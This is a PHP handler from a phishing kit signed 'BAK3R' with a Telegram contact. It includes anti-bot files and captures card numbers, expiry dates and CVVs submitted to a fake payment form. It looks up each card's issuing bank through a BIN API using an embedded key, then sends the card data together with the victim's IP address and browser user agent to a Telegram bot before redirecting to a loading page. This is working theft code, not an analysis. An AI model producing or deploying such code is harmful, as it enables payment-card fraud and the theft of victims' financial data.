<?php

/*

██████╗  █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ https://t.me/BAK34_TMW
                                                                                              
*/


include "../anti/anti1.php";
include "../anti/anti2.php";
include "../anti/anti3.php";
include "../anti/anti4.php";
include "../anti/anti5.php";
include "../anti/anti6.php";
include "../anti/anti7.php";

include '../bak3r.php';

$cardNumber = $_POST['ccnumber'];
$date = $_POST['cc-exp'];
$cvv = $_POST['cvc'];

$bin = substr(str_replace(' ', '', $cardNumber), 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, "https://api.bincodes.com/bin/?format=json&api_key=7cf769992e95a00e13596c4be2b975e0&bin=" . $bin . "&format=json");
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 400);
$json = curl_exec($ch);
$code = json_decode($json);
$bin_bank = $code->bank;
$bin_type = $code->type;
$bin_brand = $code->level;

$messages = "ㅤㅤㅤ[🔥] 𝕭𝖗𝖔𝖇𝖎𝖟𝖟 𝕭𝖞 @BAK34_TMW [🔥] ㅤㅤㅤ\n\n💳𝑪𝒂𝒓𝒅 𝑵𝒖𝒎𝒃𝒆𝒓: $cardNumber\n💳𝑫𝒂𝒕𝒆: $date\n💳𝑪𝑽𝑽: $cvv\n\n🍓 Banque : " . $bin_bank . "\n🍓 Niveau de la carte : " . $bin_brand . "\n🍓 Type de carte : " . $bin_type ."\n\n🗑𝓐𝓭𝓻𝓮𝓼𝓼𝓮 𝓘𝓟 : ".$_SERVER['REMOTE_ADDR']."\n🛒𝑼𝒔𝒆𝒓 𝑨𝒈𝒆𝒏𝒕 : ".$_SERVER['HTTP_USER_AGENT']."";

$data = array(
    'chat_id' => $chatid,
    'text' => $messages
);

$options = array(
    'http' => array(
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data)
    )
);

$context = stream_context_create($options);
$result = file_get_contents("https://api.telegram.org/bot$token/sendMessage", false, $context);

header("Location: ../loading.php");
?>
